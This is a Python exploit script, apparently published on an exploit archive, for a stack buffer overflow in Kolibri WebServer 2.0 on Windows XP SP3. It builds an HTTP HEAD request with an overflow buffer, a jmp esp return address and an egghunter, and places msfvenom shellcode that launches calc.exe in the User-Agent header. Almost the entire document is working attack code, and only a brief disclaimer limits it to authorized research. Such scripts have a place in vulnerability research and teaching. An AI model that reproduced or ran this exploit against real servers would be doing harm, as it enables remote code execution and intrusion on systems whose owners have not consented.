'''
	Exploit Scripter: Abhilash Nigam
	Vulnerable Software: Kolibri WebServer 2.0
		Available Here: https://www.exploit-db.com/apps/4d4e15b98e105facf94e4fd6a1f9eb78-Kolibri-2.0-win.zip
	Payload: windows/exec CMD=calc.exe
	System Info: Windows XP SP3

	Disclaimer: PLEASE! This is for research purposes only, and should only be used on authorized systems.
				Accessing a computer system or network without authorization or explicit permission is illegal.
'''
 
import socket
import os
import sys

egg = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"  		#egghunter: b33f
		"\xef\xb8\x62\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00'
buf =  "b33fb33f"
buf += b""
buf += b"\xdd\xc0\xbf\xbf\x46\x3b\x17\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x31\x83\xea\xfc\x31\x7a\x14\x03\x7a\xab\xa4"
buf += b"\xce\xeb\x3b\xaa\x31\x14\xbb\xcb\xb8\xf1\x8a\xcb\xdf"
buf += b"\x72\xbc\xfb\x94\xd7\x30\x77\xf8\xc3\xc3\xf5\xd5\xe4"
buf += b"\x64\xb3\x03\xca\x75\xe8\x70\x4d\xf5\xf3\xa4\xad\xc4"
buf += b"\x3b\xb9\xac\x01\x21\x30\xfc\xda\x2d\xe7\x11\x6f\x7b"
buf += b"\x34\x99\x23\x6d\x3c\x7e\xf3\x8c\x6d\xd1\x88\xd6\xad"
buf += b"\xd3\x5d\x63\xe4\xcb\x82\x4e\xbe\x60\x70\x24\x41\xa1"
buf += b"\x49\xc5\xee\x8c\x66\x34\xee\xc9\x40\xa7\x85\x23\xb3"
buf += b"\x5a\x9e\xf7\xce\x80\x2b\xec\x68\x42\x8b\xc8\x89\x87"
buf += b"\x4a\x9a\x85\x6c\x18\xc4\x89\x73\xcd\x7e\xb5\xf8\xf0"
buf += b"\x50\x3c\xba\xd6\x74\x65\x18\x76\x2c\xc3\xcf\x87\x2e"
buf += b"\xac\xb0\x2d\x24\x40\xa4\x5f\x67\x0e\x3b\xed\x1d\x7c"
buf += b"\x3b\xed\x1d\xd0\x54\xdc\x96\xbf\x23\xe1\x7c\x84\xdc"
buf += b"\xab\xdd\xac\x74\x72\xb4\xed\x18\x85\x62\x31\x25\x06"
buf += b"\x87\xc9\xd2\x16\xe2\xcc\x9f\x90\x1e\xbc\xb0\x74\x21"
buf += b"\x13\xb0\x5c\x42\xf2\x22\x3c\xab\x91\xc2\xa7\xb3"


buffer = "A" *461
buffer += "\x90" * 10
buffer += egg
buffer += "\x90" * (515 - len(buffer))
buffer += "\x59\x54\xC3\x77"					#Address to jmp esp alternative. 
buffer += "\xEB\xC4\x90\x90"					#instruction to jump back 60 bytes (-60: c4) to our egg hunter
 
request = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: 127.0.0.1:8080\r\n"
"User-Agent: " + buf + "\r\n"					#sending our payload here
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("127.0.0.1", 8080))
expl.send(request)
expl.close()
